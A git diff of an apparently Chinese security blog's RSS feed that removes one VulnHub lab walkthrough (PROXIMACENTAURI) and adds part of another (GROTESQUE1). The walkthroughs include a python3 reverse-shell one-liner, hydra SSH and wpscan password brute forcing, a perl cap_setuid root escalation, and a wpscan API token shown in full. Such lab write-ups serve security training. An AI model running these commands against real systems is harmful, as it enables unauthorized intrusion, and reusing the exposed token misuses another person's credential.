@@ -7,171 +7,45 @@
         <language>zh-CN</language>
         <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
         <lastBuildDate>Mon, 01 Nov 2021 00:00:00 +0800</lastBuildDate>
-        <category>生命</category>
-        <category>意义</category>
-        <category>成长</category>
-        <category>人生</category>
-        <category>命运</category>
-        <category>神学</category>
-        <category>人生哲学</category>
-        <category>社会</category>
-        <category>爱情</category>
-        <category>人性</category>
-        <category>历史</category>
-        <category>道德</category>
+        <category>ENFP</category>
         <category>ENFJ</category>
-        <category>ENTJ</category>
+        <category>ESTP</category>
         <category>ENTP</category>
         <category>ESFJ</category>
-        <category>ESTJ</category>
-        <category>ESFP</category>
+        <category>ENTJ</category>
         <category>INFJ</category>
-        <category>ESTP</category>
-        <category>INFP</category>
         <category>INTJ</category>
-        <category>ENFP</category>
-        <category>ISFJ</category>
-        <category>ISFP</category>
-        <category>ISTJ</category>
-        <category>MBTI</category>
         <category>INTP</category>
+        <category>ISFP</category>
+        <category>ESTJ</category>
+        <category>ISTJ</category>
+        <category>ESFP</category>
+        <category>MBTI</category>
         <category>ISTP</category>
-        <category>VULNHUB 1-10</category>
+        <category>INFP</category>
+        <category>ISFJ</category>
         <category>心理测试</category>
+        <category>VULNHUB 1-10</category>
         <category>VULNHUB 11-20</category>
         <category>VULNHUB 21-30</category>
         <category>VULNHUB 31-40</category>
         <category>VULNHUB 41-50</category>
         <category>渗透测试</category>
-        <category>信息安全网址</category>
-        <category>Linux</category>
         <category>Trojan</category>
-        <item>
-            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/</guid>
-            <title>VULNHUB 31 PROXIMACENTAURI</title>
-            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/</link>
-            <category>VULNHUB 31-40</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tcHJveGltYWNlbnRhdXJpLDcwOS8=&#34;&gt;https://www.vulnhub.com/entry/hacksudo-proximacentauri,709/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDM0NzYyL2FydGljbGUvZGV0YWlscy8xMTg2NjM1NTE=&#34;&gt;https://blog.csdn.net/qq_45434762/article/details/118663551&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 PROXIMACENTAURI：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-786.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.5&lt;/p&gt;
-&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
- &lt;code&gt;sudo nmap -A -p- 192.168.31.5&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-787.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机开放端口 80&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNQ==&#34;&gt;http://192.168.31.5&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-788.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;目录扫描:  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.5&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-789.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找到很多目录，暂时不知道哪个目录比较敏感，需要依次访问&lt;/p&gt;
-&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzLw==&#34;&gt;http://192.168.31.5/docs/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-790.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;看到一个 php 后缀的文件，点开看看:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzL3VwZGF0YS5waHA=&#34;&gt;http://192.168.31.5/docs/updata.php&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-791.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-792.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9pbWFnZXMv&#34;&gt;http://192.168.31.5/images/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-793.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9sb2dpbi5waHA=&#34;&gt;http://192.168.31.5/login.php&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-794.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 得到一个后台的登陆地址，并且该 web 是有 pluck 4.7.13 写出来的&lt;/p&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy8=&#34;&gt;http://192.168.31.5/files/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-795.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9hZG1pbi5waHA=&#34;&gt;http://192.168.31.5/admin.php&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-796.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;管理员的后台地址，会自动跳转到 login 界面&lt;/p&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9yb2JvdHMudHh0&#34;&gt;http://192.168.31.5/robots.txt&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-797.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9wbGFuZXQv&#34;&gt;http://192.168.31.5/planet/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-798.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQv&#34;&gt;http://192.168.31.5/files/planet/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-799.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQuaHRtbA==&#34;&gt;http://192.168.31.5/files/planet.html&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-800.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9yZXF1aXJlbWVudHMucGhw&#34;&gt;http://192.168.31.5/requirements.php&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-801.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找不到更多的线索了，根据已有的进行总结，发现只有一个 pluck 4.7.13 的信息，和一个后台的登陆地址可以利用&lt;/p&gt;
-&lt;h3 id=&#34;pluck-漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pluck-漏洞利用&#34;&gt;#&lt;/a&gt; pluck 漏洞利用&lt;/h3&gt;
-&lt;p&gt;用 searchsploit 搜索寻 pluck 对应版本漏洞，发现存在一个授权才能访问的 RCE 漏洞&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-802.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;确认 payload 的位置，将其复制到自己的目录下&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-803.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-804.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;阅读此 py 文件，根据脚本中的内容，带参数执行脚本&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-805.png&#34; width=&#34;220&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;由于此漏洞只适应于 pluck 的授权 RCE，此处如果不能破解出来其账户和密码，显然无法使用，经尝试并不是弱口令，放弃这个目标，继续信息搜集&lt;/p&gt;
-&lt;h3 id=&#34;dirb-扩大信息面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dirb-扩大信息面&#34;&gt;#&lt;/a&gt; dirb 扩大信息面&lt;/h3&gt;
-&lt;p&gt;dirb 的优点在于搜集到一级目录后，还会继续尝试二级目录的识别&lt;/p&gt;
-&lt;p&gt;用 dirb 收集更多的字目录信息: &lt;code&gt;dirb 192.168.31.5&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-806.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;依次去打开这些二级目录，发现了一个敏感的地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoLw==&#34;&gt;http://192.168.31.5/data/trash/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-807.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;继续向下深入，看三级目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoL2ZpbGVzL3NoZWxsLnBoYXI=&#34;&gt;http://192.168.31.5/data/trash/files/shell.phar&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;最终在此路径下找到了一个 shell.phar 的文件，此命名就比较敏感&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-808.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 访问此目录，是一个 webshell，现在拿到了网站权限&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-809.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在网站上执行命令有诸多不便，需要将其反弹到终端上&lt;/p&gt;
-&lt;p&gt;检测到服务器没有 nc，有一个 python3 ，就用 python3 来反弹 shell&lt;br&gt;
- &lt;code&gt;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.31.75 &amp;quot;,444 4 ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-810.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;设置 stty 的格式，输出为一个比较美观的终端&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-811.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;端口敲门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口敲门&#34;&gt;#&lt;/a&gt; 端口敲门&lt;/h3&gt;
-&lt;p&gt;敲门（knock）指的是我们从自己的客户端设备（pc、笔记本或者手机）向服务器 IP 发送一系列实现约好的暗号，而服务器上需要相应的安装接收暗号的服务 knockd，它在接收到正确的暗号的时候，会临时性的为敲门者开一段时间的门并随后关上（当然也能够配置成一直开着），我们要在这几秒钟里面登录成功并且保持连接，如果不小心断了连接就要重新敲门。&lt;/p&gt;
-&lt;p&gt;拿到服务器的权限之后，去看了一些敏感文件，敏感权限之后都没有任何问题，筛选端口的时候发现 knock 命令&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-812.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看 knock 的配置文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-813.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找到了一个 root 账户的端口敲门的配置问题，依次去敲击 14,29,43 端口可以将防火墙规则调整为开放，依次去敲击 62,40,46 端口可以将防火墙规则调整为关闭，注意有一个两个端口之间的间隔时间不能大于 15 ms&lt;/p&gt;
-&lt;p&gt;依次按顺序敲击这三个端口 &lt;code&gt;sudo nmap -p 14,29,43 192.168.31.5&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-814.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;敲击端口前，是 22 是被过滤的，端口敲门之后并没有立即将端口轰开，反而是等待了一段时间之后才将 22 端口打开，现在 22 已经打开，可以通过 ssh 去连接这台服务器了，但是我们并没有 root 账户的密码，怎么去连接呢。&lt;/p&gt;
-&lt;p&gt;先直接去做，看能不能有什么收获 &lt;code&gt;ssh root@192.168.31.5&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-815.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
-&lt;p&gt;看到了一个 github 地址，点开进入&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-816.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;发现是一系列密码并且提示用 proxima、centauri 进行爆破，将字典加载到本地，准备用 hydra 爆破一波&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-817.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看到服务器上存在的用户&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-818.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;服务器存在 proxima、centauri 用户，将这两个名字写到 user.txt 中，用 hydra 进行爆破&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-819.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;hydra -L user.txt -P passwd.txt ssh://192.168.31.5 -t 4 -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-820.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;很遗憾，爆破失败，继续往下做，在实际测试中，经常有爆破失败的情况，我们需要从更多的角度去收集服务器的信息，经过检查，发现服务器上存在 mysql 的备份文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-821.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 备份文件中就有用户名和密码，alfauser:passw0rd&lt;/p&gt;
-&lt;h3 id=&#34;数据库信息泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库信息泄露&#34;&gt;#&lt;/a&gt; 数据库信息泄露&lt;/h3&gt;
-&lt;p&gt;登陆数据库，查询敏感账户和密码： &lt;code&gt;mysql -u alfauser -p&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-822.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;连接成功，搜索敏感文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-823.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;一翻搜索后，在数据库中找到了 proxima 账户和其密码，切换账户至 proxima 账户，成功拿到其 shell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-824.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;cap_setuid-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cap_setuid-提权&#34;&gt;#&lt;/a&gt; cap_setuid 提权&lt;/h3&gt;
-&lt;p&gt;接下来要想办法提权至 root，直接上监控 linpeas 看有什么可疑的文件&lt;br&gt;
- &lt;code&gt;wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-825.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;运行 linpeas 进行检测&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-826.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;使用 linpeas 之后监测到一个权限设置错误的命令 perl&lt;/p&gt;
-&lt;p&gt;Capabilities 是 linux 的一种访问控制能力，能够更精细化的将操作系统权限（网络，文件等）赋权给应用程序，其中就包括设置 uid 和 gid 的权限。因此具备 cap_setuid 和 cap_setgid 权限的程序可以用来进行权限提升。&lt;/p&gt;
-&lt;p&gt;提权利用命令在 gtfobins 上可以找到更多：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGVybC8=&#34;&gt;https://gtfobins.github.io/gtfobins/perl/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-827.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;看官方介绍，也就是为了细分 root 权限的 capabilities，但是也会因为设置错误导致权限提升&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;./perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &amp;quot;/bin/sh&amp;quot;;&#39;&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-828.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
- ]]></description>
-        </item>
+        <category>信息安全网址</category>
+        <category>生命</category>
+        <category>人生</category>
+        <category>成长</category>
+        <category>人生哲学</category>
+        <category>意义</category>
+        <category>神学</category>
+        <category>Linux</category>
+        <category>社会</category>
+        <category>历史</category>
+        <category>命运</category>
+        <category>人性</category>
+        <category>爱情</category>
+        <category>道德</category>
         <item>
             <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/132%20JETTY/</guid>
             <title>VULNHUB 32 JETTY</title>
@@ -508,6 +382,222 @@ pty.spawn(&amp;quot;/bin/bash&amp;quot;)&lt;/p&gt;
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/136%20GROTESQUE1/</guid>
+            <title>VULNHUB 36 GROTESQUE1</title>
+            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/136%20GROTESQUE1/</link>
+            <category>VULNHUB 31-40</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTEwMSw2NTgv&#34;&gt;https://www.vulnhub.com/entry/grotesque-101,658/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BlcnBldHVhbF9CbHVlL2FydGljbGUvZGV0YWlscy8xMjQ1NDE4OTM=&#34;&gt;https://blog.csdn.net/Perpetual_Blue/article/details/124541893&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 GROTESQUE1：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-950.png&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.29、靶机开放端口 80&lt;/p&gt;
+&lt;p&gt;2 ）再次确认开放端口&lt;/p&gt;
+&lt;p&gt;识别到的 80 端口，没有其他的端口，感觉是有问题的，因为这种情况很少能侵入到系统，需要再次进行扫描判断结果是否正确&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-951.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机开放端口 66,80&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjk=&#34;&gt;http://192.168.31.29&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-952.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;目录扫描:  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.29&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-953.png&#34;&gt;
+&lt;p&gt;-&amp;gt; 80 端口可以放弃了，开始把目标放在 66 端口上&lt;/p&gt;
+&lt;h3 id=&#34;智力游戏解谜1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解谜1&#34;&gt;#&lt;/a&gt; 智力游戏解谜 1&lt;/h3&gt;
+&lt;p&gt;打开 http://192.168.31.29:66/ 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-954.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;看到有个地址可以直接下载项目地址，这里我们直接点击下载&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-955.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;这么多文件，一眼看去只有几个是 1.18 号的文件，先对这几个文件测试&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-956.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;按日期这一列对这些文件进行排序，输入如下命令  &lt;code&gt;ls -Alh | sort -k 7&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-957.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;接下来就依次看看这几个文件  &lt;code&gt;cat assets/* | sort | uniq&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-958.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;一堆乱码，是没有价值的信息 &lt;code&gt;cat index.md&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-959.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;这个文件没有有价值的信息 &lt;code&gt;cat _vvmlist | sort | uniq&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-960.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 在这个文件中找到了一个 wordpress 的站点&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-961.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;wordpress-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress-渗透测试&#34;&gt;#&lt;/a&gt; wordpress 渗透测试&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZw==&#34;&gt;http://192.168.31.29/lyricsblog&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-962.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;直接用 wpscan 工具对 wordpress 站点进行扫描&lt;br&gt;
+ &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -e&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-963.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;得到一个用户名 erdalkomurcu&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-964.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;指定用户为 erdalkomurcu 进行密码爆破&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -U erdalkomurcu -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-965.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;密码爆破了很长时间都没成功，可能是一个复杂密码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-966.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;从工具出发没有找到，那么我们就从常规的目录扫描进行测试&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-967.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;一些常规的目录，没有什么特殊的，就是有一个 login 地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-968.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 既然工具和目录扫描都没有发现可疑的信息，可以尝试去检查一些源代码，看看靶机作者有没有遗留一些提示给我们&lt;/p&gt;
